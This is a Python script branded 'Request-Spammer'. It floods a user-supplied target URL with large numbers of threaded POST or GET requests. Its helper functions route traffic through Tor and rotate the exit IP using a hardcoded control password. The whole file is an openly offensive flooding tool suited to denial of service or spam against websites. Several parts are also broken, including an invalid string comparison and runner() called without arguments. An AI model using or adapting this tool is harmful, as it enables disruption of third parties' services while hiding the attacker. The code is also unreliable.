import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from stem import Signal
from stem.control import Controller

# -*- coding: utf-8 -*-
clear = lambda: os.system('cls')



def logo():
    print(r"""\    
 ███████████                                                   █████                █████████                                                                        
░░███░░░░░███                                                 ░░███                ███░░░░░███                                                                       
 ░███    ░███   ██████   ████████ █████ ████  ██████   █████  ███████             ░███    ░░░  ████████   ██████   █████████████   █████████████    ██████  ████████ 
 ░██████████   ███░░███ ███░░███ ░░███ ░███  ███░░███ ███░░  ░░░███░    ██████████░░█████████ ░░███░░███ ░░░░░███ ░░███░░███░░███ ░░███░░███░░███  ███░░███░░███░░███
 ░███░░░░░███ ░███████ ░███ ░███  ░███ ░███ ░███████ ░░█████   ░███    ░░░░░░░░░░  ░░░░░░░░███ ░███ ░███  ███████  ░███ ░███ ░███  ░███ ░███ ░███ ░███████  ░███ ░░░ 
 ░███    ░███ ░███░░░  ░███ ░███  ░███ ░███ ░███░░░   ░░░░███  ░███ ███            ███    ░███ ░███ ░███ ███░░███  ░███ ░███ ░███  ░███ ░███ ░███ ░███░░░   ░███     
 █████   █████░░██████ ░░███████  ░░████████░░██████  ██████   ░░█████            ░░█████████  ░███████ ░░████████ █████░███ █████ █████░███ █████░░██████  █████    
░░░░░   ░░░░░  ░░░░░░   ░░░░░███   ░░░░░░░░  ░░░░░░  ░░░░░░     ░░░░░              ░░░░░░░░░   ░███░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ ░░░░░ ░░░ ░░░░░  ░░░░░░  ░░░░░     
                            ░███                                                               ░███                                                                  
                            █████                                                              █████                                                                 
                           ░░░░░                                                              ░░░░░                                                                  """)


# Y/n
def query_yes_no(question, default="yes"):
    valid = {"yes": True, "y": True, "ye": True,
             "no": False, "n": False}
    if default is None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while True:
        sys.stdout.write(question + prompt)
        choice = input().lower()
        if default is not None and choice == '':
            return valid[default]
        elif choice in valid:
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' "
                             "(or 'y' or 'n').\n")


# Send-POST
def send(url, data):
    try:
        html = requests.post(url, data)
        return html.text
    except requests.exceptions.RequestException as e:
        return e


# Send-GET
def send_get(url, data):
    try:
        html = requests.get(url, data)
        return html.text
    except requests.exceptions.RequestException as e:
        return e


# Send-Tor
def tor_send(url, data):
    session = requests.session()

    # TO Request URL with SOCKS over TOR
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'
    session.proxies['https'] = 'socks5h://localhost:9050'
    html = session.post(url, data)
    return html.text


# runner
def runner(url, data, met):
    threads = []
    if met == '1':
        with ThreadPoolExecutor(max_workers=16) as executor:
            for i in range(times):
                threads.append(executor.submit(send, url, data))

            for task in as_completed(threads):
                print(task.result())
    else:
        with ThreadPoolExecutor(max_workers=16) as executor:
            for i in range(times):
                threads.append(executor.submit(send_get, url, data))

            for task in as_completed(threads):
                print(task.result())


def tor_runner():
    tor_threads = []
    with ThreadPoolExecutor(max_workers=16) as executor:
        for i in range(times):
            tor_threads.append(executor.submit(tor_send, url, data))

        for task in as_completed(tor_threads):
            print(task.result())


# Chnage Tor ip
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="QAZ123qaz")
        controller.signal(Signal.NEWNYM)


while True:
    logo()
    print("Please enter a option:")
    print('1. Run Flooder')
    print('2. Run Flooder from Config')
    print('3. Create Config')
    value = input()
    if value == '1':
        clear()
        # tor = query_yes_no("Do you want to use TOR?")
        met = input("DO you want to use POST/GET")
        url = input("Enter the target url:\n")
        data2 = input("Enter the data for the requests:\n")
        times = int(input("Enter the times that your requests will be sent:\n"))
        v_response = input("Enter the desire respones (default=200):\n")
        data = (json.loads(data2))
        if met == 'POST' & 'P' & 'p':
            met = 1
        elif value == 'GET' & 'G' & 'g':
            met = 0
        runner(url, data, met)





    elif value == '2':
        name = input("Enter the config name:\n")
        with open(name, "r") as read_file:
            output = json.load(read_file)
            times = int(input("Enter the times that your requests will be sent:\n"))
            url = output['url']
            data = output['data']
            data = (json.loads(data))
            runner()
    elif value == '3':
        clear()
        name = input("Enter desire config name:\n")
        url = input("Enter the target url:\n")
        data = input("Enter the data for the requests:\n")
        v_response = input("Enter the desire respones (default=200):\n")
        # create conf
        # print(url.replace('"',''))
        config = {"url": url, "data": data, "response": v_response}
        with open(name, "w") as write_file:
            json.dump(config, write_file)
